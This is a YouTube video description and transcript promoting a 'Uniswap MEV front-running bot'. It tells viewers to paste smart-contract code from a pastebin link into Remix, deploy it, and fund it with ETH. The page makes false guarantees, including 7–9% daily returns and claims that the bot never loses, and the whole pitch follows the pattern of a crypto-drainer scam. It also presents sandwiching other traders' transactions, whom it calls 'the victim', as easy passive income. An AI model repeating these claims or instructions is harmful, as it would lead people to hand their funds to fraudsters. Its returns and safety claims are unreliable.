title: How to use Arbitrage MEV Bot For Uniswap 2022
description: Easy to Use Arbitrage MEV bot for Uniswap  Uniswap is a cryptocurrency exchange which uses a decentralized network protocol. If you trade crypto on Uniswap, 1inch or any other decentralized exchange (DEX), then you need to know about front-running bots sniping profits across exchange's pools.  You are now able to take advantage of those arbitrages yourself, a benefit that was previously only available to highly skilled devs. Here we provide you the access to our user-friendly (no coding skills required) MEV bot. Enjoy stress-free passive income from day one.  Our flagship project that we recently released is Uniswap Liquidity Bot which runs on ETH pairs on Uniswap making profits from arbitrage trades.  Using our smart contract source code allows users to create their own liquidity bots which stacks up the profits from automatic trades for the users.  We share our UniswapLiquidityBot smart contract for free, but there's 0.1% fee deducted from every successful trade user's bot executes, which goes to us.  We also provide any future updates of the code to our users for free on lifetime basis as well as any support needed.  How to launch your own arbitrage bot:  1. Download MetaMask (if you don't have it already):  metamask.io/download.html  2. Access Remix:  remix.ethereum.org/  3. Click on the “contracts” folder and then create “New File”. Rename it as you like, i.e: “bot.sol”  Note: If there is a problem if the text is not colored when you create bot.sol and paste the codes from pastebin, try again. If the codes are not colored, you cannot proceed to the next step.  4. Paste this code in Remix:  pastebin.com/NYN58SMW  5. Go to the “Solidity Compiler” tab, select version “0.6.6+commit.6c089d02” and then select “Compile bot.sol”.  Make sure “UniswapLiquidityBot (bot.sol)” is selected in the CONTRACT section of the SOLIDITY COMPILER section.  6. Go to the “DEPLOY & RUN TRANSACTIONS” tab, select the “Injected Provider - Metamask” environment and then “Deploy”. By approving the Metamask Contract creation fee, you will have created your own contract.  7. Copy your newly created Contract address as shown on video and charge it with any amount of ETH that you would like the bot to earn with by simply sending ETH to your newly created Contract address.  8. After your transaction is confirmed, click the “start” button to run the bot. Withdraw your ETH at any time by clicking the “Withdraw” button.  That's it. The bot will start working immediately earning you profits from arbitrage trades on Uniswap pools.  FAQ  If many people will use the bot, wouldn't dilution of profits occur?  We do not plan to limit access to the bot for now because there won't be any affect for us or our users profiting as pools that the bot works on are with the biggest liquidities and volumes on Uniswap so our users involvement in the pools will always be very minor.  What average ROI can I expect?  According to our latest data of bot performances (past 3 weeks) ROI is about +7–9% daily per user. The bot does not make any losses, it only executes trades when there's proper arbitrage opportunity to make profit, so under all circumstances user is always on plus.  What amount of funds bot need to work?  There's no minimum or maximum capital that user can put to work. Bot will run with any amount in the same way. However, we recommend funding the contract with at least 0.5-1 ETH to cover gas fees and possible burn fees. Bot targets token contracts with max 10% burn fee and anything lower but nowadays most of tokens comes with 3~6% fees. If you fund the contract with less than recommended and the bot targets another token with high burn fees the contract will basically waste in fees more than make profit.  Does it work on other chains or DEXes as well?  No, currently the bot is dedicated only for Ethereum on Uniswap pools.

asr.full_text: Hello everyone! My name is George and in this YouTube video tutorial I'll be explaining to you an easy method to make passive income using Uniswap. Have you ever made a transaction in Uniswap where you forgot to decrease the slippage? If so you may have received fewer tokens than you were expecting. This is because your transaction has been front-run by a bot who takes advantage of the slippage. So basically in this video we'll be talking about how to build a smart contract bot who does the same my smart contract bot which i'll call a front running bot will allow us to automatically trade a given token for the ethereum blockchain on uniswap and one inch without having to go through the typical transaction methods this is going to allow us to snip the pending transactions that are not yet mined on the mempool and then it's going to allow us to sniff the pending transactions that are not yet mined on the mempool and then it's going to allow us to inject our transaction with a higher gas fee than the transaction which is entered. Now this will allow our transaction to be processed first and then will also send a sell order within the same block. So basically, the victim's transaction gets sandwiched between ours and we make a profit from the slippage difference in the transaction? Let me explain more of what front running is with an example. Let's say Alice wants to exchange $1000 worth of Ethers for UNI token. And lets suppose that the UNI price is $5 at the moment of the transaction. So if we do a simple calculation Alice will receive 200 units of the UNI token. But as the price of a token may increase, Uniswap requires users to set slippage, which means the percentage of an eventual price increase that you accept for the transaction to go through. Now, in this example, if Alice set slippage to 10%, which means that she agrees to pay up to $5.5 per UNI token, that's about 181 tokens for $1000. So when Alice submitts the transaction using Metamask, the scenario will be ... Our bot will spot Alice's transaction and buy Unitoken at the price of $5 And increase the price, so Alice will buy higher Alice will buy 181 units of Unititoken at a price of 5.5. So our bot will sell all the tokens bought on the first transaction and then keep the profit, which is in the example, it's about $91 minus gas fees, all of that in the same block. So to start off, you'll need to have MetaMask installed and connected to the Ethereum mainnet. If you don't have MetaMask installed, you can find a link in the description on how to install it. To deploy our contract go to Remix Ethereum Compiler. Remix is a web application that allows us to develop, deploy, compile, and launch smart contracts coded in the Solidity language. You will find the link to the Remix website in the description below. Now, head over to the left side bar, and create a new file named Bot.sol. If you look at the description I have included a link to this code. You need to copy and paste that code. This is our Front Runner Bot Contract we are going to deploy. A couple of things to look at after pasting the code are line 55 and 56. If you check the addresses on ether scan, you'll see that these are the addresses of wrapped ether tokens. Okay. So you can see it's the official wrapped ether address. It's always a good idea to check. Now back to remits, now that our bot file is ready. It's always a good idea to check that. Now back to Remix. Now that our bot file is ready, let's compile it. On the side menu, click Solidity Compiler. As you can see the contract is built for the zero point six point six version of Solidity. Under compiler, select the version zero point six point six so it'll match our contract. Now click on compile bot dot so soul and wait for the bot to Compile. So now we deploy this to our wallet head on over to deploy and run transactions on remix under the environment select injected web 3 to connect remix to our metamask Finally make sure you know swap bot bought soul is selected under contract. Now the deployment utility is ready. Click the deploy button to publish our contract to the Ethereum blockchain. We need to confirm the creation of our contract by paying some gas fees. I always set gas fees too high, so it will speed up the transactions. It's not a lot of difference but click confirm and wait for the transaction to be mined Transaction confirmed now our contract is deployed so as you can see here there are four action s for a contract. The start button will start the bot sniffing the mempool. Withdrawal will stop the bot and transfer funds back to your wallet owner which returns the owner of the contract and stop will stop the bot from sniffing the mempool so let's copy the contract address and make sure it was created head back to ether scan and paste it okay it says it was successfully created so the next step is to fund our contract with some ethers to be able to snipe liquidity pools i'm going to copy this address and and head back over to my Metamask. Now make sure you've copied the right address. You can fund the contract with whatever amount you want, but obviously the more you put in, the larger the transaction you'll be able to front run, and the more profit you'll be able to accumulate over time. So for instance, say you're only front running with 0.5 ethers you won't be able to create as much slippage in the price as if you were inserting something like 10 ethers, sweet. There we go. Okay. So, transaction confirmed and the contract is funded. We can check that, by following our contract address on therscan.io. As you can see, our contract has 1 etherium on its balance, which is, basically, the amount we funded it with. The last step is to click start. This will enable the bot to start sniffing the mempool to find different liquidity pairs in order for you to frontrun the transactions. See you guys in a couple hours. Guys, I want to share theit the bot made for me. So I have something around 1.17 Ether which is around 17%. You can see the transactions that our bot made the Internal Transaction Tab. As you can see here are the front runs transactions that our bot made over the 10 hours. There are a total of 7 transactions Now if we calculate the sum profit minus gas fees we get exactly 0.17eth. So I'll see you in 10 hours Alright guys let's see how much more we made It's about 1.37 Ether So basically it took me about a day to gain my deposit by more than a third. Something close to 40%, which isn't that bad. So the bot will continue to run until you press the withdrawal button. The bot will then exit the liquidity pool and will return back to your wallet. The ETH you entered initially plus that profit. So lets click it. This will charge us a little bit of gas. I will set it to high again and then we click confirm. There we go. The transaction is confirmed. So lets go to our Metamask to check and see what I have got now. as you can see the balance from the bot in my wallet, I have had weeks where I have made 5-6 ethers, sometimes its not always profitable and profits fluctuate week to week. But usually I have 2 Aetheriums a week. Now if you have any questions you can contact me on Telegram I'll put link to the Telegram below. So guys share your profits in the comments below hit the like button if you found this video valuable and don't forget to subscribe so that you can stay updated
